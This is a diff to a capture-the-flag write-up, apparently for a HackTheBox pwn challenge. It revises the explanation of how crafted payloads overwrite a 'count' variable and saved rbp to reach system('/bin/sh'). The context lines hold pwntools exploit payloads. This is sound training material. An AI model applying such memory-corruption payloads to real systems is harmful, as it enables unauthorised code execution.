@@ -151,7 +151,7 @@ payload = b'0001' + b'htb\x00\x00000' + p32(0x60) + b'0'*0x28
 p.sendafter(b'server!\n', payload)
 ```
 
-We want to change `count` to 0x60 so that `count` will be added with 0x30 and become 0x90, the same place as payload 0x30. For payload 0x31, we will keep the var `count` same as 0x90 so that it will be added with 0x30 and become 0xc0, which is saved rbp:
+We want to change `count` from 0x90 to 0x60 so that `count` will be added with 0x30 and become 0x90 again, the same place as payload 0x30. For payload 0x31, we will keep the var `count` same as 0x90 so that it will be added with 0x30 and become 0xc0, which is saved rbp:
 
 ```python
 payload = b'0001' + b'htb\x00\x00111' + p32(0x90) + b'1'*0x28
@@ -203,7 +203,7 @@ Now, when the program execute main again, payload 0x30, 0x31, 0x32 is the same a
 
 ### Stage 2: Get shell
 
-We have libc address so let's craft a simple system("/bin/sh") to get shell:
+Struct with payload 0x30, 0x31 and 0x32 remain the same so we just need to pass struct with number 0 to execute system("/bin/sh") to get shell:
 
 ```python
 payload = b'0000' + b'htb\0' + b'\x003333333'
